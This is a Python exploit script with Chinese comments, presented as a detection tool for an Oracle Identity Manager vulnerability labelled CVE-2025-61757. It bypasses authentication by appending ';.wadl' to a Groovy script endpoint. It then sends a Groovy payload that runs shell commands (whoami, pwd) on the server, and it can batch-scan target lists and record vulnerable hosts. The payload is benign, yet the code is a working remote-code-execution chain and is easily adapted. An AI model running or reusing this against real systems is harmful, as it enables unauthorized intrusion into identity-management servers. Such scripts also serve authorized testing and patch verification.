#!/usr/bin/env python3
"""
Oracle Identity Manager 漏洞检测简化版
仅供学习研究使用
"""

import requests
import sys
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning

# 禁用SSL警告
disable_warnings(InsecureRequestWarning)

def check_target(target_url):
    """
    检查单个目标是否存在漏洞
    """
    
    # 1. 标准化URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = f"https://{target_url}"
    
    target_url = target_url.rstrip('/')
    
    print(f"\n[+] 正在检查: {target_url}")
    
    try:
        # 2. 测试认证绕过
        bypass_url = f"{target_url}/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus;.wadl"
        
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json',
        }
        
        # 发送空请求测试绕过
        response = requests.post(
            bypass_url, 
            headers=headers, 
            data='{}',
            verify=False,
            timeout=10,
            allow_redirects=False
        )
        
        # 3. 判断认证绕过是否成功
        if response.status_code == 200:
            print(f"  [✓] 认证绕过成功 (状态码: {response.status_code})")
            
            # 4. 如果认证绕过成功，测试命令执行
            return test_rce_vulnerability(target_url)
        else:
            print(f"  [✗] 认证绕过失败 (状态码: {response.status_code})")
            return False, None
            
    except requests.exceptions.Timeout:
        print("  [✗] 连接超时")
        return False, None
    except requests.exceptions.ConnectionError:
        print("  [✗] 连接失败")
        return False, None
    except Exception as e:
        print(f"  [✗] 发生错误: {e}")
        return False, None

def test_rce_vulnerability(target_url):
    """
    测试远程命令执行漏洞
    """
    
    rce_url = f"{target_url}/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus;.wadl"
    
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/json',
    }
    
    # 使用无害的命令执行payload
    payload = {
        "script": """
        def result = new StringBuilder()
        result.append("USER: ").append("whoami".execute().text.trim())
        result.append("\\nPWD: ").append("pwd".execute().text.trim())
        return result.toString()
        """,
        "compile": True
    }
    
    try:
        print(f"  [*] 正在测试命令执行...")
        
        response = requests.post(
            rce_url,
            headers=headers,
            json=payload,
            verify=False,
            timeout=15,
            allow_redirects=False
        )
        
        if response.status_code == 200:
            response_text = response.text
            
            # 检查是否有命令执行结果
            if 'USER:' in response_text or 'PWD:' in response_text:
                print(f"  [✓] RCE漏洞存在！")
                print(f"  [*] 命令输出:\n{response_text}")
                return True, response_text
            elif 'Script Compilation Successful' in response_text:
                print(f"  [!] 存在漏洞但命令可能无回显")
                return True, "漏洞存在但无回显"
            else:
                print(f"  [✗] 漏洞存在但命令执行失败")
                return True, "漏洞存在但执行失败"
        else:
            print(f"  [✗] 命令执行请求失败 (状态码: {response.status_code})")
            return False, None
            
    except Exception as e:
        print(f"  [✗] 命令执行测试异常: {e}")
        return False, None

def scan_single_target(target_url):
    """
    扫描单个目标
    """
    print("\n" + "="*60)
    print(f"Oracle Identity Manager 漏洞检测")
    print("="*60)
    
    is_vulnerable, result = check_target(target_url)
    
    print("\n" + "="*60)
    if is_vulnerable:
        print(f"[!] 发现漏洞: {target_url}")
        print("[!] 请立即修复！")
    else:
        print(f"[✓] 未发现漏洞: {target_url}")
    print("="*60)

def scan_multiple_targets(file_path):
    """
    从文件批量扫描多个目标
    """
    try:
        with open(file_path, 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        print(f"\n[+] 加载了 {len(targets)} 个目标")
        
        vulnerable_targets = []
        
        for target in targets:
            is_vulnerable, result = check_target(target)
            if is_vulnerable:
                vulnerable_targets.append(target)
        
        # 输出总结
        print("\n" + "="*60)
        print("扫描完成！")
        print("="*60)
        
        if vulnerable_targets:
            print(f"\n[!] 发现 {len(vulnerable_targets)} 个存在漏洞的目标:")
            for i, target in enumerate(vulnerable_targets, 1):
                print(f"  {i}. {target}")
            
            # 保存结果
            with open('vulnerable_targets.txt', 'w') as f:
                f.write("# 存在漏洞的目标列表\n")
                for target in vulnerable_targets:
                    f.write(f"{target}\n")
            print(f"\n[+] 结果已保存到: vulnerable_targets.txt")
        else:
            print(f"\n[✓] 未发现存在漏洞的目标")
            
    except FileNotFoundError:
        print(f"[✗] 文件不存在: {file_path}")
    except Exception as e:
        print(f"[✗] 读取文件失败: {e}")

def print_usage():
    """
    打印使用说明
    """
    print("""
Oracle Identity Manager 漏洞检测工具 （by xh）

使用方法:
  python3 CVE-2025-61757.py <目标URL>
  或
  python3 CVE-2025-61757.py -f <目标文件>

参数:
  <目标URL>         单个目标URL，如: https://example.com:7001
  -f <目标文件>     包含多个目标的文件，每行一个

示例:
  python3 CVE-2025-61757.py https://192.168.1.100:7001
  python3 CVE-2025-61757.py -f targets.txt

免责声明:
  本工具仅用于授权安全测试，请在合法范围内使用。
    """)

def main():
    """
    主函数
    """
    if len(sys.argv) < 2:
        print_usage()
        return
    
    target = sys.argv[1]
    
    if target == "-f" and len(sys.argv) >= 3:
        # 批量扫描模式
        file_path = sys.argv[2]
        scan_multiple_targets(file_path)
    elif target.startswith("http://") or target.startswith("https://") or "://" not in target:
        # 单个目标扫描
        scan_single_target(target)
    else:
        print_usage()

if __name__ == "__main__":
    main()